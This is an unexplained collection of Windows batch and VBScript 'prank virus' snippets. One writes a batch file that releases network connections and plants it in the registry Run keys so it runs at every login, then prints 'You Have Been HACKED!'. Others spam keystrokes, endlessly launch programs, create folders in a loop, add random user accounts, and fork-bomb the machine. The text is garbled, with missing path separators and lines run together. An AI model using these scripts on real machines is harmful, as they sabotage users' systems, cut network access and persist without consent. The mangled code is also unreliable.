echo @echo off>c:windowswimn32.bat
echo break off>c:windowswimn32.bat echo
ipconfig/release_all>c:windowswimn32.bat
echo end>c:windowswimn32.batreg add
hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /freg add
hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /fecho You Have Been HACKED!
PAUSE

Set wshShell = wscript.CreateObject(”WScript.Shell”)
 do
 wscript.sleep 100
 wshshell.sendkeys “~(enter)”
 loop

@echo off
 :x
 start winword
 start mspaint
 start notepad
 start write
 start cmd
 start explorer
 start control
 start calc
 goto x

@echo off
:x
md %random%
/folder.
goto x

@echo off
:xnet
user %random% /add
goto x

%0|%0